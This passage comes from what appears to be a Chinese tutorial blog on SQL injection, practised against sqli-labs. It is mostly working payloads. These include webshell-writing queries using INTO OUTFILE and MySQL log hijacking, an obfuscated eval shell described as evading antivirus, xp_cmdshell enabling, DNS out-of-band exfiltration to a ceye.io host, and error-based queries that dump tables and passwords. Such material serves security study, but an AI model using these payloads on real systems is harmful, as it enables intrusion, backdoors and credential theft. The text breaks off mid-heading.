title="读写问题：魔术引号开关"></a>读写问题：魔术引号开关</h4><ul><li><p>概念</p><p>魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，<u>对单引号、双引号、反斜线、NULL加上一个反斜线进行转义</u>，这个的作用跟addslashes()的作用完全相同。addslashes()函数返回在预定义字符之前添加反斜杠的字符串。</p><p>在phpstudy中，该开关为参数magic_quotes_gpc，在php.ini的990行左右。</p><p>其实由于不是所有数据都需要转义，出于性能的考虑，魔术引号开关在PHP5.4.0及其之后PHP版本中被取消了，在运行时调用转义函数（如 addslashes()）会更有效率。</p><img src="/posts/Users/cbcao/AppData/Roaming/Typora/typora-user-images/image-20220726165029504.png" alt="image-20220726165029504" style="zoom:67%;"></li><li><p>影响</p><p>如果开启魔术引号，则上传语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,load_file(&#x27;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\sql-lab.sql&#x27;),3</span><br></pre></td></tr></table></figure><p>会被转义成如下内容，使SQL注入命令失效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,load_file(\&#x27;D:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\sqli-labs-master\\\\sql-lab.sql\&#x27;),3</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726165127494.png" alt="image-20220726165127494"></p></li><li><p>绕过</p><p><strong>可以把引号所包含的路径内容（不要单引号）编码为hex进行绕过</strong>。</p><p>绕过原理：sql可以识别并执行用hex表示的语句</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726165729917.png" alt="image-20220726165729917"></p></li></ul><h3 id="利用SQL注入执行命令"><a href="#利用SQL注入执行命令" class="headerlink" title="利用SQL注入执行命令"></a>利用SQL注入执行命令</h3><p><a href="https://www.cnblogs.com/feiquan/p/8673093.html">https://www.cnblogs.com/feiquan/p/8673093.html</a></p><p>借助 xp_cmdshell 运行cmd命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">USE master</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE --先执行一次刷新，处理上次的配置</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1 --启用xp_cmdshell的高级配置</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE --刷新配置</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1  --打开xp_cmdshell,可以调用SQL系统之外的命令</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">--使用xp_cmdshell在D盘创建一个myfile 文件夹</span><br><span class="line">EXEC xp_cmdshell &#x27;mkdir d:\myfile&#x27;,no_output --[no_output]表示是否输出信息</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p>SQLserver执行系统命令的几种方式：<a href="https://www.cnblogs.com/Azjj/p/14019312.html">https://www.cnblogs.com/Azjj/p/14019312.html</a></p><ul><li><p><strong>xp_cmdshell</strong></p></li><li><p><strong>SP_OACREATE</strong></p></li><li><p><strong>通过沙盒执行命令</strong></p></li></ul><h3 id="x3D-x3D-SQL注入写webshel-x3D-x3D"><a href="#x3D-x3D-SQL注入写webshel-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;SQL注入写webshel&#x3D;&#x3D;"></a>&#x3D;&#x3D;SQL注入写webshel&#x3D;&#x3D;</h3><p><a href="https://blog.csdn.net/huangyongkang666/article/details/123728115">https://blog.csdn.net/huangyongkang666/article/details/123728115</a></p><h4 id="上传webshell文件"><a href="#上传webshell文件" class="headerlink" title="上传webshell文件"></a>上传webshell文件</h4><p>上传文件的条件：</p><ol><li>网站物理路径；</li><li>文件写入的权限；</li><li>secure_file_priv 不为 NULL；</li></ol><p>secure_file_priv&#x3D;NULL时，无法导入导出文件；而当设置不为空时，导入导出文件不受限制；如果设置为某个文件路径，如secure_file_priv&#x3D;&#x2F;mysql&#x2F;时，则导入导出必须要在该文件目录下完成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;’ into outfile &#x27;D:/WWW/evil.php&#x27;</span><br><span class="line"></span><br><span class="line">?id=1 union select 1,&quot;&lt;?php @eval($_POST[&#x27;g&#x27;]);?&gt;&quot;,3 into outfile &#x27;D:/WWW/evil.php&#x27;</span><br><span class="line"></span><br><span class="line">?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile &quot;D:/WWW/evil.php&quot;</span><br></pre></td></tr></table></figure><h4 id="利用分隔符写入"><a href="#利用分隔符写入" class="headerlink" title="利用分隔符写入"></a>利用分隔符写入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1 into outfile &#x27;D:/WWW/evil.php&#x27; fields terminated by &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span><br><span class="line"></span><br><span class="line">?id=1 into outfile &#x27;D:/WWW/evil.php&#x27; lines terminated by &#x27;&lt;?php phpinfo() ?&gt;&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=1 LIMIT 0,1 INTO OUTFILE &#x27;D:/WWW/evil.php&#x27; lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines terminated by  （一句话hex编码）#</span><br><span class="line"></span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; fields terminated by （一句话hex编码）#</span><br><span class="line"></span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; columns terminated by （一句话hex编码）#</span><br><span class="line"></span><br><span class="line">?id=1 INTO OUTFILE &#x27;物理路径&#x27; lines starting by    （一句话hex编码）#</span><br></pre></td></tr></table></figure><h4 id="利用日志写入"><a href="#利用日志写入" class="headerlink" title="利用日志写入"></a>利用日志写入</h4><p>新版本的MySQL设置了导出文件的路径，很难在获取Webshell过程中去修改配置文件，无法通过使用select into outfile来写入一句话。这时，我们可以通过修改MySQL的log文件来获取Webshell。</p><p>利用条件：</p><ul><li>对web目录有写权限</li><li>GPC关闭(GPC:是否对单引号转义)</li><li>有绝对路径(读文件可以不用，写文件需要)</li><li>需要能执行多行SQL语句</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;             # 查看配置</span><br><span class="line"></span><br><span class="line">set global general_log = on;               # 开启general log模式,将所有到达MySQL Server的SQL语句记录下来。</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;D:/WWW/evil.php&#x27;; # 设置日志目录为shell地址</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php eval($_GET[g]);?&gt;&#x27;              # 写入shell</span><br><span class="line"></span><br><span class="line">set global general_log=off;                   # 关闭general log模式</span><br></pre></td></tr></table></figure><p>在高版本的mysql中默认为NULL，就是不让导入和导出</p><p>解决办法：</p><p>在Windows下可在my.ini的[mysqld]里面，添加secure_file_priv</p><p>在linux下可在&#x2F;etc&#x2F;my.cnf的[mysqld]里面，添加secure_file_priv</p><p>使用慢查询日志绕过此限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;#查看慢查询日志开启情况</span><br><span class="line"></span><br><span class="line">set global slow_query_log=1#开启慢查询日志</span><br><span class="line"></span><br><span class="line">set global slow_query_log_file=&#x27;D:/phpStudy/WWW/evil.php;    #修改日志文件存储的绝对路径</span><br><span class="line"></span><br><span class="line">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);#写入shell</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;; #使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间</span><br></pre></td></tr></table></figure><p>免杀shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php $p = array(&#x27;f&#x27;=&gt;&#x27;a&#x27;,&#x27;pffff&#x27;=&gt;&#x27;s&#x27;,&#x27;e&#x27;=&gt;&#x27;fffff&#x27;,&#x27;lfaaaa&#x27;=&gt;&#x27;r&#x27;,&#x27;nnnnn&#x27;=&gt;&#x27;t&#x27;);$a = array_keys($p);$_=$p[&#x27;pffff&#x27;].$p[&#x27;pffff&#x27;].$a[2];$_= &#x27;a&#x27;.$_.&#x27;rt&#x27;;$_(base64_decode($_REQUEST[&#x27;cmd&#x27;]));?&gt;&quot;</span><br></pre></td></tr></table></figure><h2 id="6-SQL注入进阶"><a href="#6-SQL注入进阶" class="headerlink" title="6. SQL注入进阶"></a>6. SQL注入进阶</h2><h3 id="x3D-x3D-堆叠注入-x3D-x3D"><a href="#x3D-x3D-堆叠注入-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;"></a>&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;</h3><p><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p><p>stacked injections（堆叠注入）就是多条sql语句一起执行。在mysql 中，一条语句结尾加<code>;</code>表示语句结束，多语句之间以分号隔开。堆叠注入就是利用这个特点，在第二个SQL语句中构造自己要执行的语句。</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users; select * from emails;</span><br></pre></td></tr></table></figure><p>将堆叠注入运用于创建用户，以此迂回得到自定义的账户密码。但是前提是网站的管理员必须是高权限才能完全创建用户。也可以使用update更新管理员用户密码。</p><p><code>id=1&#39;;insert into users(id,username,password) values ( 39, &#39;less38 &#39;, &#39;hello &#39;)--+</code></p><p>当网站使用PDO技术（一种防护手段）执行SQL语句时，可以执行多语句，不过这样通常不能直接得到注入结果，因为PDO只会返回第一条SQL语句执行的结果， 所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据。</p><p><code>id=1&#39;;select if(substr(user(),1,1)=&#39;r&#39;, sleep(3), 1)--+</code></p><h3 id="加解密编码注入"><a href="#加解密编码注入" class="headerlink" title="加解密编码注入"></a>加解密编码注入</h3><p>某些注入点会对参数值进行编码。比如下面的cookie进行了base64编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /Less-21/index.php HTTP/1.1</span><br><span class="line">Host: 10.1.1.133</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://10.1.1.133/Less-21/index.php</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: uname=YWRtaW4%3D</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p><code>YWRtaW4%3D</code>是一个base64加密的字符串，其中%3D是编码中的<code>=</code>符号，把他发送到编码模块当中解密，得到明文admin。</p><p>所以构造好注入语句后，也需要进行编码，也就是说<code>admin&#39; and 1=1</code>加密之后的值是<code>YWRtaW4nIGFuZCAxPTE=</code>。</p><p>而获取数据库名称的报错盲注的语句<code>admin&#39; or updatexml(1,concat(0x7e,(database())),0) or &#39;</code>加密后cookie值<code>Cookie: uname=YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChkYXRhYmFzZSgpKSksMCkgb3IgJwo=</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728092746776.png"></p><h3 id="二次注入（绕过转义）"><a href="#二次注入（绕过转义）" class="headerlink" title="二次注入（绕过转义）"></a>二次注入（绕过转义）</h3><p>（sqlilabs less 24）</p><p>二次注入原理，主要分为两步</p><ul><li><p>第一步：插入恶意数据</p><p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据。但是，数据本身包含恶意内容。</p></li><li><p>第二步：引用恶意数据</p><p>在将数据存入到了数据库中之后。开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一 步的检验和处理，这样就会造成SQL的二次注入。</p><p>在前端和URL（黑盒测试）是无法发现二次注入，无法用工具扫描，<u>只有在代码审计时才能发现是否存在二次注入，也就是提前知道所插入的恶意数据的类型，在哪里被SQL利用</u>。</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/d03f2d86af5e7aee0e09c2379236aa52378eac48.png@812w_395h_progressive.webp" alt="img"></p><p><strong>举例：</strong></p><p>比如<u>已经通过代码审计知道</u>，网页有注册和查询&#x2F;更改密码的功能，并且：</p><p>注册页面会在后台执行insert语句<code>insert into user(id,username,pwd) values(2,’x’,’123’)</code></p><p>更改密码，则包含update语句<code>upadte user set pwd=’123456’ where id=2 and username=’admin’</code>。</p><p>在注册页面网站使用了addslashes进行了特殊字符的转义，所以无法直接进行注入。但是也因此可以插入一些恶意数据，比如使用<code>admin&#39; and 1=1#</code>作为用户名进行注册。</p><p>那么在更新密码页面，就会执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upadte user set pwd=’123’ where id=2 and username=&#x27;admin&#x27; and 1=1#&#x27;</span><br></pre></td></tr></table></figure><p>同理，如果换成注册其它用户名，更新的时候也会形成不同的注入语句。</p><p>比如使用<code>dhakkan&#39;#</code>作为用户名注册，那么更新密码时就会执行：</p><p><code>upadte user set pwd=’sss’ where username=&#39;dhakkan&#39;#&#39;</code></p><p>被更新密码的账户从<code>dhakkan&#39;#</code>变成了<code>dhakkan</code>。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/4bdb21dc2e0d6958a868d38e4560a7de15dfa1c8.png@461w_92h_progressive.webp" alt="img"></p><p>以此类推，可以借助用户名来爆数据库信息：</p><p>若输入用户名：<code>&#39; or updatexml(1,concat(0x7e,version()),0) or’</code> 和密码：123</p><p>那么更新密码的SQL就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`update users set pwd=&#x27;sss&#x27; where username=&#x27;&#x27; or updatexml(1,concat(0x7e,version()),0) or&#x27;&#x27; and password=&#x27;123456&#x27;</span><br></pre></td></tr></table></figure><p>但是网站有时会限制用户名长度，如果是在前端限制，可以修改Maxlength，如果是后端代码进行的限制，则无法成功注入。</p><h3 id="load-file-amp-DNSlog注入（解决无回显）"><a href="#load-file-amp-DNSlog注入（解决无回显）" class="headerlink" title="load_file&amp;DNSlog注入（解决无回显）"></a>load_file&amp;DNSlog注入（解决无回显）</h3><p>sqlilabs-less9-load_file&amp;dnslog 带外注入（实际案例）</p><p><strong>dnslog解决了盲注不能回显数据，效率低的问题</strong></p><p><strong>原理</strong>：<code>load_file</code>支持对外的<strong>文件读取</strong>，通过在URL中加入SQL语句，可以<u>借助读取DNS访问记录得到SQL语句的执行结果</u>。</p><p>比如构造如下语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if((select load_file(concat(&#x27;////&#x27;,(select version()),&#x27;.yk2kql.ceye.io//abc&#x27;))),0,1)--+</span><br></pre></td></tr></table></figure><p><strong>工具</strong>：<a href="http://ceye.io，注册后可以获得个人的DNS地址：">http://ceye.io，注册后可以获得个人的DNS地址：</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/9ded59fe90f60d1cdb4049308f40ac2abe13467b.png@725w_165h_progressive.webp" alt="img"></p><p>成功注入之后，可以在ceye.io网站看到所访问的链接，其中包含了version()数据库版本信息5.5.53.1。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728101718259.png" alt="image-20220728101718259"></p><p>或者查看数据库名称：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if((select load_file(concat(&#x27;////&#x27;,(select database()),&#x27;.yk2kql.ceye.io//abc&#x27;))),0,1)--+</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814095417887.png" alt="image-20220814095417887"></p><p>参考资料：<a href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a></p><p>使用DnsLog盲注仅限于windos环境。</p><ul><li><p><strong>使用工具DnslogSqlinj</strong></p><p><a href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728102540802.png" alt="image-20220728102540802"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728102804316.png" alt="image-20220728102804316"></p><p>获取数据库名称：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728103014120.png" alt="image-20220728103014120"></p></li></ul><h3 id="宽字节注入（绕过转义）"><a href="#宽字节注入（绕过转义）" class="headerlink" title="宽字节注入（绕过转义）"></a>宽字节注入（绕过转义）</h3><p>当网站对参数进行了转义时，单引号等会被转义符（反斜杠）转义，导致攻击语句失效。所以在一般情况下，此处是不存在SQL注入漏洞的。</p><p>不过有一个特例，就是当数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式是在单引号前会先加个%df。这样就变成了<code>id=1%df&#39;</code>，经过转义就是<code>id=1%df%5c&#39;</code>。因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字”連”，所以这时，单引号成功被读入。</p><p>所以可以构造攻击语句：<code>id=1%df&#39; and 1=1%23</code>进行注入点的判断。</p><h3 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h3><p>XFF是HTTP请求头中的一个头部参数X-Forwarded- for。X- Forwarded- For简称XFF头，它代表客户端真实的IP。</p><p>通过修改X-Forwarded-for的值可以伪造客户端IP，将X Forwarded -for设置为127.0.0.1，然后访问该URL，页面返回正常。</p><p>如果网站有通过诸如$_SERVER之类的函数获取XFF，并用于SQL语句，那么就可以尝试进行注入。</p><p>比如构造攻击语句：<code>X Forwarded -for=127.0.0.1&#39; union select 1,2,3,4#</code></p><h2 id="7-SQL注入类型"><a href="#7-SQL注入类型" class="headerlink" title="7. SQL注入类型"></a>7. SQL注入类型</h2><h3 id="按照注入方式"><a href="#按照注入方式" class="headerlink" title="按照注入方式"></a>按照注入方式</h3><h4 id="普通注入和盲注"><a href="#普通注入和盲注" class="headerlink" title="普通注入和盲注"></a>普通注入和盲注</h4><p>普通注入就是注入的<u>页面是直接显示数据库中的字段内容的</u>，我们可以通过 SQL 注入一步一步把数据库中我们想要的内容显示在页面中。</p><p>盲注则要困难很多，<u>页面不直接显示数据库字段内容</u>，显示的可能只是一个判断结果（是或者否），页面只能告诉你你构造的 SQL 语句对还是错，你要查询的内容存在还是不存在。</p><p>其中不回显的原因可能是 SQL 语句的问题导致，因为像insert、delete等查询语句即使执行成功，也不会回显。此外，网站的前端页面显示也会限制。</p><ul><li><p>select 查询数据</p><p>例：<code>select * from news where id=$id</code></p><p>应用：查询用户</p></li><li><p>insert 插入数据</p><p>例：<code>insert into users(id,username,password) values(30,&#39;x&#39;,&#39;123&#39;)</code></p><p>应用：网站的用户注册</p><p>和select操作的数据包相似，但是不能像普通select注入一样操作。</p></li><li><p>delete 删除数据</p><p>例：<code>delete from users where id=30</code></p><p>应用：后台管理里面删除用户等操作、删除留言等</p></li><li><p>update 更新数据</p><p>例：<code>update users set password=&#39;123&#39; where id=11 and username=&#39;admin3&#39;</code></p><p>应用：会员或后台中心数据同步或缓存等操作、登录后修改个人信息，如密码等</p></li><li><p>order by 排序数据</p><p>一般结合表名或列名进行数据排序操作</p><p>例：select * from news order by $id</p><p>例：select id,name,price from news order by $order</p></li></ul><h4 id="基于报错的SQL盲注（优先）"><a href="#基于报错的SQL盲注（优先）" class="headerlink" title="基于报错的SQL盲注（优先）"></a>基于报错的SQL盲注（优先）</h4><p>12种报错注入+万能语句：<a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p><p>floor、extractvalue、updatexml报错原理：<a href="https://developer.aliyun.com/article/692723">https://developer.aliyun.com/article/692723</a></p><ul><li><p><strong>floor向下取整数</strong></p><p>0x7e为<code>~</code></p><p>rand() 产生[0,1)的随机小数；</p><p>group by 按照指定字段对查询结果进行分组，常结合count()、sum()、avg()、max()、min()等使用。</p><p>利用了MySQL的第8652号bug ：Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果：在 <strong>rand()和group by同时使用</strong> 的时候，可能会产生超出预期的结果，因为会<u>多次对同一列进行查询</u>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//select</span><br><span class="line">// 爆数据库版本</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 通过修改limit后面数字一个一个爆表</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 爆出所有表</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 爆出所有字段名</span><br><span class="line">1&#x27; and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 爆出所有字段名</span><br><span class="line">1&#x27; and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">//爆出该账户的密码。</span><br><span class="line">1&#x27; and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username=&#x27;admin1&#x27;),0x7e,floor(rand(0)*2)))a)# </span><br><span class="line"></span><br><span class="line">//insert</span><br><span class="line">username=x&#x27; or (select 1 from (select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;</span><br><span class="line"></span><br><span class="line">//update</span><br><span class="line">add=hubeNicky&#x27; or (select 1 from (select count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or &#x27;</span><br><span class="line"></span><br><span class="line">// delete</span><br><span class="line">id=56+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)</span><br><span class="line">// 由于是在数据包中编辑，所以用+代替空格，避免歧义</span><br></pre></td></tr></table></figure><p>报错结果如下，显示出了数据库名称：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195036461.png" alt="image-20220727195036461"></p></li><li><p><code>extractvalue(xml_frag, xpath_expr)</code></p><p>xml_frag为XML标记片段，xpath_expr表示从XML字符串中匹配元素。如果xpath_expr格式语法书写错误的话，就会报错，输出xpath_expr。利用这个特性可以构造注入点。</p><p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p><p>![1551928141656](<a href="https://blogs-pic.oss-cn-beijing.aliyuncs.com/images/2019-03-07">https://blogs-pic.oss-cn-beijing.aliyuncs.com/images/2019-03-07</a> 报错注入：extractvalue、updatexml&#x2F;1551928141656.png?x-oss-process&#x3D;style&#x2F;shuiyin)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// insert</span><br><span class="line">username=x&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;</span><br><span class="line"></span><br><span class="line">// update</span><br><span class="line">add=hubeNicky&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;</span><br><span class="line"></span><br><span class="line">// delete</span><br><span class="line">?id=56+or+extractvalue(1,concat(0x7e,database()))</span><br></pre></td></tr></table></figure><p>其中的concat()函数是将其参数连成一个字符串，因此不会符合xpath_expr的格式，从而出现格式错误，爆出</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727193832420.png" alt="image-20220727193832420"></p></li><li><p><code>UpdateXML(xml_document, xpath_expr, new_xml)</code></p><p>xml_document：String格式，为XML文档对象的名称</p><p>xpath_expr：Xpath格式的字符串</p><p>new_xml：String格式，替换查找到的符合条件的数据</p><p>作用：改变文档中符合条件的节点的值，即改变XML_document中符合XPATH_string的值</p><p>此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为新的XML片段 new_xml，然后返回更改的XML。xml_document替换的部分 与xpath_expr用户提供的XPath表达式匹配。</p><p>如果未xpath_expr找到表达式匹配，或者找到多个匹配项，则该函数返回原始xml_document的XML片段。所有三个参数都应该是字符串。</p><p>和上面的extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1551929714141.png" alt="1551929714141"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// insert</span><br><span class="line">username=x&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;</span><br><span class="line"></span><br><span class="line">// update</span><br><span class="line">add=hubeNicky&#x27; or  updatexml(1,concat(0x7e,(version())),0) or &#x27;</span><br><span class="line"></span><br><span class="line">// delete</span><br><span class="line">?id=56+or+updatexml+(1,concat(0x7e,database()),0)</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195708498.png" alt="image-20220727195708498"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195718450.png" alt="image-20220727195718450"></p></li></ul><h4 id="基于布尔的SQL盲注（其次）"><a href="#基于布尔的SQL盲注（其次）" class="headerlink" 